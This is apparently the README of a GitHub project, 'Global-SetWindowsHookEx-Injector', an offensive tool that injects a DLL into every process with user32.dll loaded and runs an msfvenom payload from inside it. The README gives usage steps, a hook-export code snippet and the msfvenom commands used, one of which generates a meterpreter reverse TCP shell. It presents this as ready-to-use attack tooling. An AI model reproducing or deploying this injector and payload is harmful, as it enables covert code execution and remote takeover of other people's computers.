# Global-SetWindowsHookEx-Injector
main.cpp: Loads test.dll into a subset of processes that have user32.dll loaded </br> 
dllmain.cpp: Launches a thread that launches an msfvenom payload whenever it is imported into a process </br>
## Payloads that have been tested with this project
`msfvenom -f c -p windows/x64/messagebox EXITFUNC=thread TEXT="Hello, from urmom"` </br>
`msfvenom -p windows/x64/meterpreter_reverse_tcp EXITFUNC=thread RHOST=127.0.0.1 RPORT=4444 -f c -o file.txt`
## Usage
1. Just add this to your dll:
extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam) {
	return CallNextHookEx(NULL, code, wParam, lParam);
}

2. Edit your dll name in hookloader/main.cpp:
HMODULE dll = LoadLibraryEx(L"test.dll", NULL, DONT_RESOLVE_DLL_REFERENCES); //<-- DLL name

3. Compile & done

![](https://github.com/Msfv3n0m/Global-SetWindowsHookEx-Injector/blob/master/loaded_dll.PNG)
## Credit
This project uses [this](https://www.bing.com/search?pglt=2081&q=mingw.threads.h+github&cvid=eda2595c8617405babee903277a23f89&aqs=edge.0.69i59l2j69i57j69i59j69i58j69i60j69i64.1251j0j1&FORM=ANNTA1&PC=U531) library to create a thread to launch the messagebox without interrupting the programs
